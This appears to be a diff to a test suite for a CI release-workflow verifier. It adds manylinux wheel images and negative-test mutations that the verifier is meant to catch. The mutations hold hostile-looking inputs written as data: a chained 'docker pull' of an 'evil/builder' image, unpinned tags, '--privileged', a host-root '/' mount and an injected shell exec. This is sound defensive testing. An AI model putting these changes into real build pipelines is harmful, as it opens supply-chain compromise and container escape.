@@ -90,7 +90,7 @@ PROFILES = {
         "trigger": {"push": {"tags": ["v*"]}},
         "workflow_env": {"CARGO_TERM_COLOR": "always", "RUST_TOOLCHAIN": "1.88.0"},
         "verify_outputs": VERIFY_OUTPUTS,
-        "images": [SBOM_IMAGE],
+        "images": [MANYLINUX_AMD64, MANYLINUX_ARM64, SBOM_IMAGE],
         "boundary": "release-identity.json",
         "verify_steps": [
             {
@@ -933,6 +933,20 @@ def mutations(text):
         sub("    needs: verify\n", ""),
         sub("sbom-tools@sha256:954267", "sbom-tools@sha256:000000"),
         sub(SBOM_IMAGE, "ghcr.io/fulmenhq/sbom-tools:latest"),
+        # Each wheel image: another digest, a moving tag, or the two swapped.
+        sub("manylinux2014_x86_64@sha256:d6b534", "manylinux2014_x86_64@sha256:000000"),
+        sub(MANYLINUX_AMD64, "quay.io/pypa/manylinux2014_x86_64:latest"),
+        sub("manylinux2014_aarch64@sha256:d41ea3", "manylinux2014_aarch64@sha256:000000"),
+        sub(MANYLINUX_ARM64, "quay.io/pypa/manylinux2014_aarch64:latest"),
+        # A container only from the reviewed wheel-build step, its image the
+        # operand docker runs and bound to the target (RELB-DV-04 shapes).
+        sub(MANYLINUX_AMD64 + " \\", MANYLINUX_AMD64 + " && docker pull docker.io/evil/builder:latest \\"),
+        sub(MANYLINUX_AMD64 + " \\", "evil-builder \\"),
+        sub(MANYLINUX_AMD64 + " \\", "alpine:latest echo " + MANYLINUX_AMD64 + " \\"),
+        sub(MANYLINUX_AMD64 + " \\", MANYLINUX_ARM64 + " \\"),
+        sub("scripts/build-wheel.sh x86_64-unknown-linux-gnu /out", "scripts/build-wheel.sh aarch64-unknown-linux-gnu /out"),
+        sub('docker run --rm --user', 'docker run --rm --privileged --user'),
+        sub('-v "$PWD:/src"', '-v "/:/src"'),
         sub(run, run + "          docker exec x sh\n"),
         sub(run, run + "          /usr/bin/docker pull ghcr.io/example/builder:latest\n"),
         sub(run, run + "          /usr/bin/docker run --rm docker.io/evil/builder:latest\n"),
